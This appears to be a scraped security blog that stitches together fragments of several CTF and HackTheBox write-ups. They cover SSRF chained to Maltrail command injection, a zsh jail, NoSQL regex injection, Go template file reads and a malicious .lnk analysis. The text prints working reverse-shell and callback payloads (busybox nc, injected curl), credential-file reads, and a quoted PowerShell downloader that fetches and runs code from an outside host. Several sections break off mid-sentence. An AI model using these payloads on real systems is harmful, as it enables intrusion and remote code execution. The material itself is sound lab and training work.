This is not simply downloading a .sln file, but rather trying to clone a git repository. Although it may be possible to emulate a git repo from an http server with the right file configuration, this is beyond my skillset. I opted to install Gitea locally, so I can host my own server that the machine can pull from. Note that these HTB machines are isolated from the broad internet, so pulling from a public web service like github will not be possible.\n1 2 3 4 5 ┌──(kali㉿kali)-[~/Documents/visual] └─$ python -m http.server 80 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ... 10.129.144.164 - - [01/Oct/2023 16:52:44] code 404, message File not found 10.129.144.164 - - [01/Oct/2023 16:52:44] \u0026#34;GET /info/refs?service=git-upload-pack HTTP/1.1\u0026#34; 404 - To set up gitea, I followed the preparations from this post.

Note the password will be whatever you made the IDENTIFIED BY parameter during the database setup. In this scenario, it is gitea. Press \u0026ldquo;Install Gitea\u0026rdquo; at the bottom of the page, and setup will be complete. After it all, we finally have our own gitea service set up and running: Now we can put whatever we want for an account, host our own repos, and even share them with whoever can access our system. Since I made this with the exclusive purpose of interacting with the box, I just made my account using the completely original asdf credentials.\nSupplying a Visual Studio project I don\u0026rsquo;t typically do visual studio things, but I have an old Chip8 project that was built with visual studio. I cloned this repo, then submitted a copy to this local gitea server: Other .sln sources can probably be easily obtained, or even creating one by launching Visual Studio if that is an option. When we send this to build, we can see a new error message:\n1 2 3 4 5 6 7 8 9 10 11 12 13 Build started 10/2/2023 8:19:35 AM.

We are given the following files in return: Now we can have the service build executables for us, but how can this be abused? The key hint is the emphasis on using visual studio.\nExploiting VS\u0026rsquo;s pre-build event Visual Studio supports pre-build event execution that we can use to execute our own malicious scripts. The easiest way to do so is use Visual Studio\u0026rsquo;s GUI, however I do not have this installed. I used this article as a reference to introduce manually. Very simply, we can add a reverse shell bat file to our repository, and edit the csproj file to call the file.

It seems for some time they were using BCrypt hashes, which is very robust at the expense of processing power. However, it looks like they have recently switched to SHA256. Checking the commit history, we see that at one point they were using SHA1, which is massively easier to crack than SHA256 or Bcrypt:\nNow, onto visiting the backup files:\n1 2 3 4 5 6 7 8 9 martin@drive:/var/www/backups$ ls -al total 3740 drwxr-xr-x 2 www-data www-data 4096 Sep 1 18:23 . drwxr-xr-x 5 root root 4096 Sep 15 13:34 .. -rw-r--r-- 1 www-data www-data 13018 Sep 1 20:00 1_Dec_db_backup.sqlite3.7z -rw-r--r-- 1 www-data www-data 12226 Sep 1 20:00 1_Nov_db_backup.sqlite3.7z -rw-r--r-- 1 www-data www-data 12722 Sep 1 20:00 1_Oct_db_backup.sqlite3.7z -rw-r--r-- 1 www-data www-data 12770 Sep 1 20:00 1_Sep_db_backup.sqlite3.7z -rwxr-xr-x 1 root root 3760128 Dec 26 2022 db.sqlite3 The current db.sqlite3 database does not contain any crackable passwords, but we should check the backup tables as well. Although this database is for the web service Doodle Grive, it is possible a user had originally used their system user password before changing. Here it would be nice to look at gitea\u0026rsquo;s commit timestamps, and we could narrow down which month contains the SHA1 hashes. However, all of the commits are dated on Dec 25th so it is not helpful. Instead, we need to view each backup database and look for the signature sha1$ before the salt.

However in addition with the \u0026#34;new self Hosted release\u0026#34; there should be a tool(doodleGrive-cli) to help the IT team in monitoring server status and fix errors that may happen.

It mentions credentials, but the email doesn\u0026rsquo;t seem to exist on the box. Fortunately, since this is a binary (and non-stripped!), the user/password check should be baked-in. We can try strings to find this, but with a quick check into vim, I find it very fast by searching for password: Using strings, we can splice out string contents.

Can you survive the onslaught? Custom sprites made by Gold\nnote: the flag matches the regex dice{[a-z_]+}\nWith this challenge, we are given an ELF executable game:\n1 2 $ file dicequest dicequest: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=5a21a66948b7d5fd5c206fbaf90b9c1fbe2e52a4, for GNU/Linux 3.2.0, stripped Checking the contents with strings can show us that the game was made with rust, but not much other details are given. Running the executable puts us in a game with simple graphics:\nThe big dice is our playable object, to the right is a shop for us. To the left is an \u0026ldquo;enemy\u0026rdquo; dice and the top left has our money count. After about a minute or so, it looks as though dragons appear and we die. Checking the contents of the shop:\nThe shop info is slightly cut off, but we can tame the dragon army if we collect $10,000! Each \u0026ldquo;enemy\u0026rdquo; kill grants us $5, so this is completely unfeasible. However, if we can edit our money amount in-game, we can give ourselves as much money as we want. Normally with windows-based executables, I would opt to use Cheat Engine, but this is a linux ELF. There seems to be a very competent alternative in gameconquerer.\nIn order to find the memory address responsible for money, we can search for addresses containing the number while we know it. For example, at the start of every game we have 0 dollars. We can search for values containing 0:\nThen as we defeat 1 enemy we are brought to $5. Searching again, we can trace values that started at 0 and are 5 after defeating 1 enemy:\nWe can repeat this process until there is only 1 address left:\nNow that we know we have the address, we can add it with the + symbol and edit the value section below. Giving myself 10000:\nThe score in top left will not change until your score is changed by defeating an enemy, but the money is still there and now we can purchase the dragon tame upgrade:\nNow when the dragons come, I survive!\nThe flag isn\u0026rsquo;t immediately apparent, but we can eventually see that the dragons are creating letters:\nWe can zoom out pretty far to see the whole flag, but the text is certainly not easy on the eyes:\nMisc zshfuck may your code be under par. execute the getflag binary somewhere in the filesystem to win\nWe are given the source code for our jail:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 #!/bin/zsh print -n -P \u0026#34;%F{green}Specify your charset: %f\u0026#34; read -r charset # get uniq characters in charset charset=(\u0026#34;${(us..)charset}\u0026#34;) banned=(\u0026#39;*\u0026#39; \u0026#39;?\u0026#39; \u0026#39;`\u0026#39;) if [[ ${#charset} -gt 6 || ${#charset:|banned} -ne ${#charset} ]]; then print -P \u0026#34;\\n%F{red}That\u0026#39;s too easy.

After selection, any string that only contains those characters will be passed to and executed inside zsh. There are some characters that are banned, as they would make it too easy. As a start, I tried to learn more about the filesystem by passing an ls -lR command:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 $ nc mc.ax 31774 Specify your charset: ls -R OK!

Naturally, we will have to reach it before being able to execute. We can also learn the current path with pwd or cwd:\n1 2 3 4 5 Specify your charset: pwd OK! Got p w d. pwd /app Thanks to the interesting behavior of passing our characters into another shell, we cannot escape via a simple -i flag:\n1 2 3 4 5 6 7 8 Specify your charset: sh -i OK! Got s h - i. sh -i sh: 0: can\u0026#39;t access tty; job control turned off $ id Nope. We see the output $ indicative of an sh session, but are still incapable of passing banned letters. By this point, it is rather clear why there are certain banned characters. If wildcards were allowed, we could hit it very easily just with /*/*/*/*/*/*. Alas, it is not that simple.\nAfter researching some special characters for zsh, i find an interesting opportunity:\n[ ] csh, sh Match range of characters. Section 1.13, Section 33.2 Following the example sections, we can see it used to encompass all characters:\n1 [a-z] Perhaps something like this can work for our situation? to begin, I try executing /app/run since it is shorter:\n1 2 3 4 5 6 7 Specify your charset: /[a-z] OK! Got / [ a - z ]. /[a-z][a-z][a-z]/[a-z][a-z][a-z] Specify your charset: asdf Nope. We can see that after i input my execution string of /[a-z][a-z][a-z]/[a-z][a-z][a-z], the jail is run a 2nd time and asks once again for a charset. I still can\u0026rsquo;t circumvent the original charset, but it is clear that we are executing /app/run! Now the challenge lies in reaching our getflag goal.

Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 92.13 seconds Ports 80 and 8338 are filtered, which is rather unusual. They could just be closed, or perhaps a firewall is placed and prohibiting interaction with these ports. We can see an unusual open port 55555. Nmap enumeration output is rather confusing, but we can see that this has some http capabilities.\nEnumerating web service on port 55555 Viewing in firefox:\nWe can create baskets, which appear to be url folders. Upon clicking the create button, we receive a token:\nWhen we visit our empty basket, we see instructions on how to use:\nWhen we visit the link, we receive an empty response. Now on our basket page, however, we can see information on the request done:\nOn the main page, we can see that this process is using the opensource project request-baskets:\nTesting SSRF disclosed for request-baskets The version is also detailed as 1.2.1, however the most recent release is v1.2.3. We can explore github release notes to see what was changed between versions, but unfortunately there is not mention of security flaws/vulnerabilities. However, using google to search version 1.2.1 provides us with CVE-2023-27163, an SSRF type vulnerability that can be used to access internal/restricted pages. There are two ideas I have for using this vulnerability. In initial nmap scanning, ports 80 and 8338 were displayed as filtered, perhaps this is something that cannot be accessed externally but can be reached through an SSRF approach. Alternatively, we might access an admin page requiring accessibility we normally don\u0026rsquo;t have. When reaching /web/baskets, it expects us to supply a master token:\nPerhaps with SSRF, a master token would be supplied as a cookie and we can view? It is a possibility worth trying.\nThis article covers the exploit details from an API request perspective, but it is not necessary with our ability to handle the GUI. In my established basket, I can edit this information from the settings cog:\nJust as the article states, we can set the proxy response and expand forward path, and set the forward url to localhost:\nNow when we visit our box, we are forwarded to a the new website on port 80!\nIt looks horrendously broken for now, but the important part is that we are able to access the internal web service despite being behind a firewall.\nFoothold Using SSRF to enumerate the firewalled web service From the webpage footer, we can understand that this service is using Maltrail v0.53:\nA quick google search shows that this service is vulnerable to an OS command injection vulnerability. The provided article lists a very simple payload that we might use:\n1 2 curl \u0026#39;http://hostname:8338/login\u0026#39; \\ --data \u0026#39;username=;`id \u0026gt; /tmp/bbq`\u0026#39; Note that the supplied port is 8338, and we did see this port filtered during our nmap scan. When I check with the SSRF method, the same landing page appears as port 80. It seems that both ports are being used to listen to the same service, so we can use either one.\nTo use this exploit, the first thing we must do is point our SSRF forwarding address at the /login page:\nWhile the request can be sent via firefox, extra steps must be done to transform the request to a POST, and supplying the data. It is easier to do in curl, just as the POC suggests. As for the payload, we shouldn\u0026rsquo;t expect to see the response if we check with id or whoami, as we are not provided with stdout. In order to confirm the RCE is working, we need to send a command that will reach back to our system. My preferred method is to check with a curl or wget request. First, we must set up a listener, either nc or python:\n1 2 ┌──(kali㉿kali)-[~] └─$ nc -lp 80 Next, we send the request to our bucket, with the injected curl command:\n1 2 ┌──(kali㉿kali)-[~] └─$ curl http://10.10.11.224:55555/3gu14de -d \u0026#39;username=;`curl 10.10.14.155`\u0026#39; After a moment of waiting, we can see a request was sent to our listener!\n1 2 3 4 5 6 ┌──(kali㉿kali)-[~] └─$ nc -lp 80 GET / HTTP/1.1 Host: 10.10.14.155 User-Agent: curl/7.68.0 Accept: */* The user-agent is curl as expected, and very importantly the host is 10.10.14.155, our victim\u0026rsquo;s IP.\nChain exploiting request-basket\u0026rsquo;s SSRF and Maltrail\u0026rsquo;s Command Injection for RCE Now to generate a reverse shell. For this, I used the busybox nc payload from revshells:\n1 2 ┌──(kali㉿kali)-[~] └─$ curl http://10.10.11.224:55555/3gu14de -d \u0026#39;username=;`busybox nc 10.10.14.155 8888 -e bash`\u0026#39; Meanwhile on my nc listener:\n1 2 3 4 5 6 ┌──(kali㉿kali)-[~] └─$ nc -nvlp 8888 listening on [any] 8888 ... connect to [10.10.14.155] from (UNKNOWN) [10.10.11.224] 34052 id uid=1001(puma) gid=1001(puma) groups=1001(puma) Privilege Escalation Stabilizing reverse shell Currently, the reverse shell has limited capabilities. We can improve the stability with script:\n1 script -qc /bin/bash /dev/null Afterwards, we must reconfigure stty from our kali terminal. Using ctrl+Z will send the reverse shell to background, were we can configure stty.\n1 2 3 4 5 6 7 8 puma@sau:/opt/maltrail$ ^Z zsh: suspended nc -nvlp 8888 ┌──(kali㉿kali)-[~] └─$ stty raw -echo; fg [1] + continued nc -nvlp 8888 puma@sau:/opt/maltrail$ fg returns the reverse shell to foreground, and now we have a stable, interactive session on the victim host.\nChecking for additional users on the system We can see that we are user puma, and notably user 1001. Since user creations typically start with number 1000, there is likely another created user on the system. We can figure this out by checking /etc/passwd:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 puma@sau:/opt/maltrail$ cat /etc/passwd root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin messagebus:x:103:106::/nonexistent:/usr/sbin/nologin syslog:x:104:110::/home/syslog:/usr/sbin/nologin _apt:x:105:65534::/nonexistent:/usr/sbin/nologin tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin sshd:x:109:65534::/run/sshd:/usr/sbin/nologin landscape:x:110:115::/var/lib/landscape:/usr/sbin/nologin pollinate:x:111:1::/var/cache/pollinate:/bin/false fwupd-refresh:x:112:116:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false puma:x:1001:1001::/home/puma:/bin/bash _laurel:x:997:997::/var/log/laurel:/bin/false Unexpectedly, there is no user with id number 1000.

We can begin by adding this entry into our /etc/hosts file:\n1 2 3 4 5 6 7 8 9 ┌──(kali㉿kali)-[~/Documents/Pilgrimage] └─$ cat /etc/hosts 127.0.0.1 localhost 127.0.1.1 kali ::1 localhost ip6-localhost ip6-loopback ff02::1 ip6-allnodes ff02::2 ip6-allrouters 10.10.11.219 pilgrimage.htb Enumerating Web Service Visiting the page, we can see it is an image shrinker. We are given the option to upload images, and the files will be presumable compressed and returned to us.\nWhen submitting a sample png, we find that it is saved in /shrunk/ under an altered name:\nTrying to upload a non-image file results in a fail message:\nWhen enumerating directories with feroxbuster, we might find an interesting folder named tmp.\n1 2 3 4 5 6 7 8 9 10 ┌──(kali㉿kali)-[~/Documents/Pilgrimage] └─$ feroxbuster -u http://pilgrimage.htb/ ___ ___ __ __ __ __ __ ___ |__ |__ |__) |__) | / ` / \\ \\_/ | | \\ |__ | |___ | \\ | \\ | \\__, \\__/ / \\ | |__/ |___ by Ben \u0026#34;epi\u0026#34; Risher 🤓 ver: 2.10.0 \u0026lt;...SNIP...\u0026gt; 301 GET 7l 11w 169c http://pilgrimage.htb/tmp =\u0026gt; http://pilgrimage.htb/tmp/ \u0026lt;...SNIP...\u0026gt; From this, we might get an idea of how this process is being done. First, uploaded files are placed in /tmp/, a compression operation is performed and saved to /shrunk/, and the link is sent back to us. There is a possibility that this allows for a race condition, where we might upload a php script, have it saved in /tmp/ and execute the script before the shrinking operation is done and the file is cleaned up. Unfortunately, this does not work presumably because the uploaded files are being renamed using some method we don\u0026rsquo;t know.\nDiscovery of git filesystem If we return to nmap after adding our /etc/hosts entry, we might see interesting new information:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 Nmap scan report for pilgrimage.htb (10.10.11.219) Host is up (0.054s latency).

The important things to note are where the flag might be located with the Dockerfile, and how we can interact with the backend of the server. from the Dockerfile, we see the flag is stored as an environment:\n1 2 3 4 5 6 7 8 9 10 $ cat Dockerfile \u0026lt;...SNIP...\u0026gt; # Setup flask app \u0026amp; create flag EXPOSE 80 ENV FLASK_APP=/app/IntCTFC/app.py ENV FLASK_ENV=production ENV FLASK_RUN_PORT=80 ENV FLASK_RUN_HOST=0.0.0.0 ENV CHALL_FLAG=\u0026#34;1337UP{fl4G_h3RE}\u0026#34; ENV SECRET_KEY=\u0026#34;fake_secret_key\u0026#34; Secret keys are usually used for cookie signing, so this is not something interesting just yet.

In lines prior to this, we can note that the database service this challenge is using is MongoDB, a NoSQL type of database:\n1 2 3 # db settings client = pymongo.MongoClient(\u0026#39;localhost\u0026#39;,27017) db = client.ctfdb when we enter the page, we are prompted to create an account. There are no limitations, so creating an account is very simple. When we enter, we see two challenges associated to the first 2 entries in the database:\nThe third challenge is not there, but notice the \u0026ldquo;release\u0026rdquo; is set to \u0026ldquo;False\u0026rdquo; for the third one. When trying to answer questions for the one listed, we see the answers match what we expect from the database:\nIf we analyze our request using Burp proxy or perhaps just with Firefox\u0026rsquo;s Network tool, we can see the request data being sent:\nIn raw data:\n1 {\u0026#34;_id\u0026#34;:\u0026#34;_id:1\u0026#34;,\u0026#34;challenge_flag\u0026#34;:\u0026#34;CTFC{cryptocat}\u0026#34;} If we modify this request to \u0026quot;_id:3\u0026quot;, then perhaps we can send a request to the 3rd challenge. However, the answer will be the flag, which we do not know. Since this is NoSQL, we might be able to abuse NoSQL Injection combined with regex queries to leak the flag. The concept goes as follows: using regex wildcards, we can generate a passing result despite knowing none of the characters. We can sequentially guess a single character 1 request at a time, and whenever we land on a correct one, the check will once again pass. For this, I copied my network request directly to curl although utilizing a tool such as Brupsuite will have a cleaner look to manage:\nThe unmodified curl request looks like this:\n1 curl \u0026#39;https://ctfc.ctf.intigriti.io/submit_flag\u0026#39; -X POST -H \u0026#39;User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0\u0026#39; -H \u0026#39;Accept: */*\u0026#39; -H \u0026#39;Accept-Language: en-US,en;q=0.5\u0026#39; -H \u0026#39;Accept-Encoding: gzip, deflate, br\u0026#39; -H \u0026#39;Referer: https://ctfc.ctf.intigriti.io/\u0026#39; -H \u0026#39;Content-Type: application/json\u0026#39; -H \u0026#39;Origin: https://ctfc.ctf.intigriti.io\u0026#39; -H \u0026#39;DNT: 1\u0026#39; -H \u0026#39;Connection: keep-alive\u0026#39; -H \u0026#39;Cookie: session=eyJ1c2VyIjp7Il9pZCI6ImI5MTk2YjgzYjZlZDQ1ZTZiOGVjMTM3YTcxNTRmNmViIiwidXNlcm5hbWUiOiJhc2RmIn19.ZVeEiA.I5nW0lG2m4QufY4UuiKTpLmNqBM\u0026#39; -H \u0026#39;Sec-Fetch-Dest: empty\u0026#39; -H \u0026#39;Sec-Fetch-Mode: cors\u0026#39; -H \u0026#39;Sec-Fetch-Site: same-origin\u0026#39; --data-raw \u0026#39;{\u0026#34;_id\u0026#34;:\u0026#34;_id:1\u0026#34;,\u0026#34;challenge_flag\u0026#34;:\u0026#34;CTFC{cryptocat}\u0026#34;}\u0026#39; To modify, we insert new JSON into the key for \u0026ldquo;correct_flag\u0026rdquo;, so that regex may be applied:\n1 \u0026#34;challenge_flag\u0026#34;:{\u0026#34;$regex\u0026#34;:\u0026#34;.*\u0026#34;} We can confirm this works by checking regex with the flag header and brackets that we already know:\n1 2 3 4 5 6 7 8 9 10 curl \u0026#39;https://ctfc.ctf.intigriti.io/submit_flag\u0026#39; -X POST -H \u0026#39;Us er-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/119.0\u0026#39; -H \u0026#39;Accept : */*\u0026#39; -H \u0026#39;Accept-Language: en-US,en;q=0.5\u0026#39; -H \u0026#39;Accept-Encoding: gzip, deflate, br\u0026#39; -H \u0026#39;Refe rer: https://ctfc.ctf.intigriti.io/\u0026#39; -H \u0026#39;Content-Type: application/json\u0026#39; -H \u0026#39;Origin: https:/ /ctfc.ctf.intigriti.io\u0026#39; -H \u0026#39;DNT: 1\u0026#39; -H \u0026#39;Connection: keep-alive\u0026#39; -H \u0026#39;Cookie: session=eyJ1c2Vy Ijp7Il9pZCI6ImI5MTk2YjgzYjZlZDQ1ZTZiOGVjMTM3YTcxNTRmNmViIiwidXNlcm5hbWUiOiJhc2RmIn19.ZVeEiA.

The response is correct flag! At this point it is probably better to just write a script to guess all combinations, or we can be mildly clever and do it manually with the slight help of extra regex. We can start by seeing if the first bracket char is lowercase by guessing [a-z], or all lowercase chars between a and z:\n1 2 3 4 curl \u0026lt;...SNIP...\u0026gt; --data-raw \u0026#39;{\u0026#34;_id\u0026#34;:\u0026#34;_id:3\u0026#34;,\u0026#34;challenge_flag\u0026#34;:{\u0026#34;$regex\u0026#34;:\u0026#34;INTIGRITI{[a-z].*}\u0026#34;}}\u0026#39; correct flag! We can guess half the alphabet, to narrow down which letter it might be:\n1 2 \u0026#39;{\u0026#34;_id\u0026#34;:\u0026#34;_id:3\u0026#34;,\u0026#34;challenge_flag\u0026#34;:{\u0026#34;$regex\u0026#34;:\u0026#34;INTIGRITI{[a-m].*}\u0026#34;}}\u0026#39; correct flag! After a couple more guesses, we narrowed down the range to 4 characters, a much easier guess than 26+:\n1 2 3 \u0026#39;{\u0026#34;_id\u0026#34;:\u0026#34;_id:3\u0026#34;,\u0026#34;challenge_flag\u0026#34;:{\u0026#34;$regex\u0026#34;:\u0026#34;INTIGRITI{[g-k ].*}\u0026#34;}}\u0026#39; correct flag! The first letter is h, so in only ~6 guesses we managed to guess a letter. Pretty good, considering there are 26 possibilities in lowercase alone! Now we can repeat the process, keeping the 1st char as h and guessing the 2nd one:\n1 2 3 \u0026#39;{\u0026#34;_id\u0026#34;:\u0026#34;_id:3\u0026#34;,\u0026#34;challenge_flag\u0026#34;:{\u0026#34;$regex\u0026#34;:\u0026#34;INTIGRITI{h[a- z].*}\u0026#34;}}\u0026#39; wrong flag! And so on.. Eventually, we can leak the entire flag:\n1 2 \u0026#39;{\u0026#34;_id\u0026#34;:\u0026#34;_id:3\u0026#34;,\u0026#34;challenge_flag\u0026#34;:{\u0026#34;$regex\u0026#34;:\u0026#34;INTIGRITI{h0w_1s_7h4t_PAWSIBLE}\u0026#34;}}\u0026#39; correct flag! Note that in this case the wildcard is gone, as a final check to see if the flag is complete. We don\u0026rsquo;t really need the $regex json either. INTIGRITI{h0w_1s_7h4t_PAWSIBLE}\nOSINT Photographs Can you help us track down this photographer? 📸\nAuthor: therealbrenu\nThe first photo is a simple lizard on a fence:\nThe very first thing to check is image metadata via exiftool:\n1 2 3 4 5 6 $ exiftool picture.jpg ExifTool Version Number : 12.65 \u0026lt;...SNIP...\u0026gt; Modify Date : 2023:09:25 23:42:32 Artist : fl0pfl0p5 \u0026lt;...SNIP...\u0026gt; We can see the artist is named fl0pfl0p5. A quick google search for the name reveals an about.me page, and a reddit account. Delving further into reddit in particular, we can see another reddit page of interest:\nIn the 2nd post, we see a different named user created a github page under the name fl0pfl0p5.\nThe github page itself is not useful, but does have a cute dead end. A hello world script has a commit \u0026ldquo;removed hardcoded secret\u0026rdquo;:\nThe important information from the reddit post is we now have a different username connected, m4r64r1n3. We can find that this person has a twitter account as well, and if you\u0026rsquo;re paying careful attention you might also note that the account was created in September, the same time where all previous activity has been happening.\nWe can see that this person posted a different picture on the twitter account. Analyzing with exiftool does not give us more information, but when we image search via google, we can find it is associated with a new blog page, and a 3rd username. Note that in order to see this result, I had to select \u0026ldquo;Find Image Source\u0026rdquo; on the image results page.\nWhen we visit the blog page, we see an interesting anonymous comment: \u0026ldquo;I don\u0026rsquo;t think it\u0026rsquo;s a good idea to share your location online.\u0026rdquo; Wise words indeed.\nThere is no location disclosure here anymore though, but perhaps it has been saved in the web archives. When we check the wayback machine, we can see an archive conveniently placed on October 2, 1 day before this comment about sharing a location.\nWhen we view the archive, we see the flag!\nINTIGRITI{D3F1N173LY_N07_60TH4M_C17Y}\n","date":"2023-11-18T10:18:48-05:00","permalink":"https://yuwenmichael.netlify.app/post/1337up-ctf/","title":"1337UP CTF"},{"content":"Web Haunt Mart An eerie expedition into the world of online retail, where the most sinister and spine-tingling inventory reigns supreme.

At this point, I decided to run a local copy with the provided Docker files so I might see requests happening in the CLI:\n1 2 3 4 5 6 7 8 9 $ sudo ./build-docker.sh \u0026lt;...SNIP...\u0026gt; * Running on http://127.0.0.1:1337 * Running on http://172.17.0.2:1337 Press CTRL+C to quit * Restarting with stat * Debugger is active! * Debugger PIN: 110-143-363 2023-10-26 17:36:49,496 INFO success: flask entered RUNNING state, process has stayed up for \u0026gt; than 1 seconds (startsecs) Now when I visit a site on the address http://127.0.0.1:1337, this running program will give me backend info on the request.

Note that the request response is a 404 error, equivalent to a page not found or not existing. Something I had overlooked was the route behavior differences between web and api. The above route source code details some routes as @api.route and others as @web.route. All page visits we have been seeing are web.route, meanwhile things such as the login post and product post are for api.route. A careful look at the POST request for product shows the address as /api/product. All this to say, I was submitting the address wrong after all. We should be looking to send it to /api/addAdmin instead!\nThe request shows green submission, and looking at the request log, we can see a response code 200 this time:\n1 2 127.0.0.1 - - [26/Oct/2023 17:57:06] \u0026#34;GET /api/addAdmin?username=asdf HTTP/1.1\u0026#34; 200 - 172.17.0.1 - - [26/Oct/2023 17:57:06] \u0026#34;POST /api/product HTTP/1.1\u0026#34; 200 - At this stage for some reason I had to log out and log back in, perhaps a caching issue? Regardless, once I return to the home page I find the flag!\nGhostly Templates In the dark corners of the internet, a mysterious website has been making waves among the cybersecurity community. This site, known for its Halloween-themed templates, has sparked rumors of an eerie secret lurking beneath the surface. Will you delve into this dark and spooky webapp to uncover the hidden truth?\nGhostly Templates is a web server utilizing Go. There is only one main page, and it mentions potential template functions we might try, and a submission form to supply our template link:\nDistraction: LFI through view. Within the view?page=, it feels like directory traversal might be possible. We can even access main.go.\nHowever, this is not the way. If we look at the source code, we can see that there is a function checking if we are accessing a file outside of the web root folder:\n1 2 3 if !reqData.IsSubdirectory(\u0026#34;./\u0026#34;, TEMPLATE_DIR+\u0026#34;/\u0026#34;+page) { http.Error(w, \u0026#34;Internal Server Error\u0026#34;, http.StatusInternalServerError) return This was something I did not find a bypass for, but there is a different solution. Also within the source code, we find an interesting function:\n1 2 3 4 5 6 7 func (p RequestData) OutFileContents(filePath string) string { data, err := os.ReadFile(filePath) if err != nil { return err.Error() } return string(data) } We can supply an html file that calls OutFileContents, have the service load our template, then execute a read on flag.txt. Because of the docker files, we know the flag exists at the base directory, outside app:\n1 2 3 4 5 6 $ cat ../Dockerfile FROM alpine:3.18.3 \u0026lt;...SNIP...\u0026gt; # Copy flag COPY flag.txt /flag.txt Making the html file:\n1 2 3 4 5 6 7 8 \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026#34;en\u0026#34;\u0026gt; \u0026lt;body\u0026gt; {{.OutFileContents \u0026#34;/flag.txt\u0026#34;}} \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; Running a local test is very simple, as we can use our internal IP address and a python server:\n1 2 $ sudo python3 -m http.server 80 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ... My internal IP is 192.168.0.164, so I can reach this by entering the link as http://192.168.0.164/test.html. When we visit, we get the test flag!\nThis is all great for testing, but the CTF machine will not be able to reach us if we try supplying the previous IP address. We need to use something such as ngrok that can allow our server to be publicly accessible.\nForensics Trick or Treat Another night staying alone at home during Halloween. But someone wanted to play a Halloween game with me. They emailed me the subject \u0026ldquo;Trick or Treat\u0026rdquo; and an attachment. When I opened the file, a black screen appeared for a second on my screen. It wasn\u0026rsquo;t so scary; maybe the season is not so spooky after all.\nWe are given a traffic capture file (pcap) and a lnk file, presumably the \u0026ldquo;malicious\u0026rdquo; link that our buddy fell for. First, examining the lnk file:\n1 2 3 $ cat trick_or_treat.lnk L�F�@FC5P�O� �:i�+00�/C:\\V1Windows@ �.WindowsZ1system32B �.system32V2cmd.exe@ �.cmd.exeTrick or treatC:�/k for /f \u0026#34;tokens=*\u0026#34; %a in (\u0026#39;dir C:\\Windows\\SysWow64\\WindowsPowerShell\\v1.0\\*rshell.exe /s /b /od\u0026#39;) do call %a -windowstyle hidden \u0026#34;$asvods =\u0026#39;\u0026#39;;$UserAgents = @(\u0026#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36\u0026#39;,\u0026#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/15.15063\u0026#39;,\u0026#39;Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko\u0026#39;);$RandomUserAgent = $UserAgents | Get-Random;$WebClient = New-Object System.Net.WebClient;$WebClient.Headers.Add(\u0026#39;User-Agent\u0026#39;, $RandomUserAgent);$boddmei = $WebClient.DownloadString(\u0026#39;http://windowsliveupdater.com\u0026#39;);$vurnwos =\u0026#39;\u0026#39;;for($i=0;$i -le $boddmei.Length-2;$i=$i+2){$bodms=$boddmei[$i]+$boddmei[$i+1];$decodedChar = [char]([convert]::ToInt16($bodms, 16));$xoredChar=[char]([byte]($decodedChar) -bxor 0x1d);$vurnwos = $vurnwos + $xoredChar};Invoke-Command -ScriptBlock ([Scriptblock]::Create($vurnwos));Invoke-Command -ScriptBlock ([Scriptblock]::Create($asvods));C:\\Windows\\System32\\shell32.dll�%SystemRoot%\\System32\\shell32.dll%SystemRoot%\\System32\\shell32.dll�%� �wN���]N�D.��Q���� ��1SPS�XF�L8C���\u0026amp;�m�m.S-1-5-21-3849600975-1564034632-632203374-1001 We can see very clearly that a request is being sent to http://windowsliveupdater.com.

